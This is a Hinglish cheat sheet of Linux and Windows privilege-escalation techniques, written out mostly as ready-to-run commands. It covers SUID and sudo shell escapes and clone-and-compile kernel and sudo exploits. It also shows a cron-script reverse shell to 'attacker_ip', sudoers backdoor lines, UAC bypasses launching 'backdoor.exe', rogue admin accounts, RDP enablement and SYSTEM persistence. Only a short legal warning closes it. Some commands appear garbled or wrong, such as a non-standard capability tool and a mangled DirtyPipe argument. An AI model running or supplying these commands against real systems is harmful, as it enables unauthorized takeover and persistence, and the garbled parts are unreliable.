# Privilege Escalation — Master Guide

**Complete Linux aur Windows Privilege Escalation Techniques**

---

## 1. Linux Privilege Escalation - SUID Binaries

**Objective:** SUID bit se root access lena.

```bash
# SUID binaries find karo
find / -perm -4000 2>/dev/null
find / -perm -u+s -type f 2>/dev/null

# Common vulnerable SUID binaries
find / -name "*sudo*" -perm -4000 2>/dev/null
find / -name "*less*" -perm -4000 2>/dev/null
find / -name "*more*" -perm -4000 2>/dev/null
find / -name "*nano*" -perm -4000 2>/dev/null
find / -name "*vi*" -perm -4000 2>/dev/null

# SUID binary exploitation
# If /bin/less is SUID root:
less /etc/shadow
!/bin/sh

# If /bin/more is SUID root:
more /etc/shadow
!/bin/sh

# If /usr/bin/awk is SUID root:
awk 'BEGIN{system("/bin/sh")}'

# If /usr/bin/perl is SUID root:
perl -e 'exec "/bin/sh"'

# If /usr/bin/python is SUID root:
python -c 'import os;os.system("/bin/sh")'
```

### GTFOBins Exploitation

```bash
# Search for vulnerable binaries on GTFOBins
https://gtfobins.github.io/

# Common vulnerable binaries
find / -perm -4000 2>/dev/null | while read binary; do
  echo "Checking: $binary"
  strings $binary | grep -i bash
done
```

**Detection Difficulty:** ⭐⭐⭐ (File permissions dikhai de sakte hain)

---

## 2. Linux Kernel Exploitation

**Objective:** Kernel vulnerability se root access lena.

```bash
# Kernel version check karo
uname -a
uname -r

# Vulnerable kernel find karo
Searchsploit "Linux kernel" <version>

# Dirty COW vulnerability (CVE-2016-5195)
git clone https://github.com/dirtycow/dirtycow.github.io.git
cd dirtycow
gcc -pthread dirty.c -o dirty -lcrypt
./dirty

# DirtyPipe vulnerability (CVE-2022-0847)
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
cd CVE-2022-0847-DirtyPipe-Exploit
gcc -o exploit exploit.c
./exploit /etc/passwd 1 ootz:$y$j9T

# CVE-2021-22555 (Netfilter)
Searchsploit "CVE-2021-22555"

# Use kernel exploit database
wget https://www.kernel.org/doc/html/latest/userspace-api/index.html
```

### Kernel Info Gathering

```bash
# Detailed kernel info
cat /proc/version
cat /proc/sys/kernel/osrelease

# Check for ASLR
cat /proc/sys/kernel/randomize_va_space

# Check for DEP/NX bit
execstack -q /bin/ls

# SMEP/SMAP status
grep -i smep /proc/cpuinfo
grep -i smap /proc/cpuinfo
```

**Detection Difficulty:** ⭐⭐⭐⭐ (System logs mein dikhai de sakta hai)

---

## 3. Sudo Exploitation

**Objective:** Sudo configuration se root access bypass karna.

```bash
# Check sudo access
sudo -l

# If user can run specific command as root
sudo -l
User testuser may run the following commands:
    (root) /usr/bin/less

# Exploit
sudo less /etc/shadow
!/bin/sh

# Sudo with NOPASSWD
sudo -l
User testuser may run the following commands:
    (root) NOPASSWD: /usr/bin/find

# Exploitation
sudo find /etc/shadow -exec cat {} \;
sudo find . -exec /bin/sh \; -quit

# Wildcard expansion in sudo
sudo /usr/bin/script *.txt
# Create: root_shell.txt
# Then: sudo /usr/bin/script /root_shell.txt

# Environment variable hijacking
sudo -l
User testuser may run the following commands:
    (root) /usr/bin/custom_script

# Check script
cat /usr/bin/custom_script
#!/bin/bash
cat /root/flag.txt

# Exploit
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/cat
echo '/bin/sh' >> /tmp/cat
chmod +x /tmp/cat
sudo /usr/bin/custom_script
```

### CVE-2021-3156 (Sudo Heap Buffer Overflow)

```bash
# Check sudo version
sudo -V

# Vulnerable version: < 1.9.5
Searchsploit sudo 1.9

# Exploit
git clone https://github.com/t0kk0s/CVE-2021-3156.git
cd CVE-2021-3156
make
./exploit
```

**Detection Difficulty:** ⭐⭐⭐ (Sudo logs se track kar sakte ho)

---

## 4. Weak File Permissions

**Objective:** Improperly configured files se sensitive data access karna.

```bash
# World-writable files find karo
find / -perm -o+w -type f 2>/dev/null

# World-readable sensitive files
find / -perm -o+r -type f 2>/dev/null | grep -E "shadow|passwd|ssh"

# Weak sudoers file
ls -la /etc/sudoers
cat /etc/sudoers

# Writable sudoers
echo "testuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# SSH private key with weak permissions
find / -name "*id_rsa*" 2>/dev/null
ls -la /root/.ssh/

# Writable home directories
find / -maxdepth 3 -perm -o+w -type d 2>/dev/null
```

---

## 5. Cron Job Exploitation

**Objective:** Cron tasks se privilege escalation karna.

```bash
# Check running cron jobs
ps aux | grep cron

# View crontab
crontab -l

# Check system cron jobs
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# Exploit: Writable cron script
# If root runs /etc/backup.sh and it's writable:
echo "#!/bin/bash" > /etc/backup.sh
echo "/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /etc/backup.sh
chmod +x /etc/backup.sh

# Wait for cron to execute

# Exploit: Path hijacking in cron
# If cron runs: /usr/bin/backup.sh
# Check PATH in crontab - usually limited
# But if wildcard used:
cd /tmp
echo "#!/bin/bash" > tar
echo "/bin/bash" >> tar
chmod +x tar
export PATH=/tmp:$PATH
# Wait for cron
```

---

## 6. Linux Capability Exploitation

**Objective:** Linux capabilities se root access lena.

```bash
# Check capabilities
cap_ng_cli_get
getcap -r / 2>/dev/null

# Find binaries with capabilities
find / -type f -exec getcap {} \; 2>/dev/null

# CAP_SETUID capability
# If binary has CAP_SETUID:
getcap /usr/bin/python
# Output: /usr/bin/python = cap_setuid+ep

# Exploitation
python -c 'import os;os.setuid(0);os.system("/bin/sh")'

# CAP_SYS_ADMIN capability
# Allows mounting filesystems
mount -t tmpfs tmpfs /tmp/fakefs
echo "root:x:0:0:root:/root:/bin/bash" > /tmp/fakefs/passwd

# CAP_DAC_OVERRIDE
# Bypasses file permissions
cat /etc/shadow  # If allowed by CAP_DAC_OVERRIDE
```

---

## 7. Windows Privilege Escalation - UAC Bypass

**Objective:** User Account Control ko bypass karke admin access lena.

```bash
# Check UAC status
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Check if user has admin rights
net user %USERNAME%

# UAC Bypass methods

# Method 1: fodhelper.exe (COM hijacking)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "" /t REG_SZ /d "cmd.exe /c C:\Temp\backdoor.exe"
C:\Windows\System32\fodhelper.exe

# Method 2: eventviewer.exe
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v "" /t REG_SZ /d "C:\Temp\backdoor.exe"
C:\Windows\System32\eventvwr.exe

# Method 3: slui.exe
reg add "HKCU\Software\Classes\exefile\shell\open\command" /v "" /t REG_SZ /d "C:\Temp\backdoor.exe"
C:\Windows\System32\slui.exe

# Method 4: compmgmt.msc
cmd.exe /k cd C:\Windows\System32
compmgmt.msc
```

### PowerShell UAC Bypass

```powershell
# Check execution policy
Get-ExecutionPolicy

# Bypass execution policy
PowerShell -ExecutionPolicy Bypass -File script.ps1

# Bypass via cmd
cmd /c PowerShell -ExecutionPolicy Bypass -File script.ps1

# UAC Bypass via PowerShell
$command = "Add-LocalGroupMember -Group Administrators -Member testuser"
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
PowerShell -EncodedCommand $encoded
```

**Detection Difficulty:** ⭐⭐ (Registry changes logged)

---

## 8. Windows Token Impersonation

**Objective:** High-privilege token ko steal karke impersonate karna.

```bash
# Check current tokens
whoami /priv

# Enable SeImpersonatePrivilege
# Use Rotten Potato or Juicy Potato exploit

# JuicyPotato (COM exploitation)
git clone https://github.com/ohpe/juicy-potato.git
cd juicy-potato
make

# Usage
JuicyPotato.exe -l 9999 -p cmd.exe

# Rotten Potato
git clone https://github.com/stephenbradshaw/rotten_potato.git
```

---

## 9. Windows Registry Exploitation

**Objective:** Registry misconfiguration se privilege escalation.

```bash
# Check for weak registry permissions
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# If writable:
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "backdoor" /t REG_SZ /d "C:\Windows\System32\cmd.exe"

# Scheduled task privilege escalation
schtasks /create /tn backdoor /tr "C:\temp\shell.exe" /sc minute /mo 5 /ru SYSTEM

# Check scheduled tasks
schtasks /query /fo LIST /v

# Services with weak permissions
sc queryex type= service state= all

# Modify service binary path
sc config <servicename> binPath= "C:\Temp\backdoor.exe"
```

---

## 10. Advanced Privilege Escalation Combo

**Objective:** Multiple techniques combine karke complete compromise.

### Full Linux Attack Chain

```bash
# Step 1: Enumeration
uname -a
cat /etc/os-release
id
sudo -l

# Step 2: Find vulnerabilities
find / -perm -4000 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Step 3: Check kernel
uname -r
Searchsploit linux kernel <version>

# Step 4: Exploit SUID or kernel
./kernel_exploit
# or
sudo less /etc/shadow
!/bin/sh

# Step 5: Root access achieved
id  # Should show uid=0
cat /root/.ssh/id_rsa
```

### Full Windows Attack Chain

```bash
# Step 1: Check privileges
whoami /priv
net user %USERNAME%

# Step 2: Check UAC status
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Step 3: UAC bypass
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "" /t REG_SZ /d "cmd.exe /c C:\Temp\backdoor.exe"
C:\Windows\System32\fodhelper.exe

# Step 4: Add admin user
net user hacker password /add
net localgroup administrators hacker /add

# Step 5: RDP access
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Step 6: Login as admin
runas /user:hacker /savecred cmd.exe
```

---

## Privilege Escalation Tools

```bash
# Linux
linpeas.sh
enum4linux
lse.sh

# Windows
WinPEAS.exe
Ghostpack
JuicyPotato
RottenPotato

# Multi-platform
Metasploit
```

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Ye techniques sirf authorized penetration testing mein use karo!

✓ Sirf apne systems par
✓ Apne companies ke permission se
✓ Bug bounty programs mein

✗ Unauthorized access ILLEGAL hai
✗ Prison time possible hai

Zimmedari se use karo!
```

---

## Quick Reference - Commands

```bash
# Linux
find / -perm -4000 2>/dev/null
sudo -l
find / -perm -o+w -type f 2>/dev/null
linpeas.sh

# Windows
whoami /priv
net user
reg add "HKCU\Software\Classes\ms-settings..." 
C:\Windows\System32\fodhelper.exe
```

---

**Banaya Gaya:** Privilege Escalation Database  
**Classification:** Post-Exploitation  
**Skill Level:** Advanced  
**Risk Level:** Critical
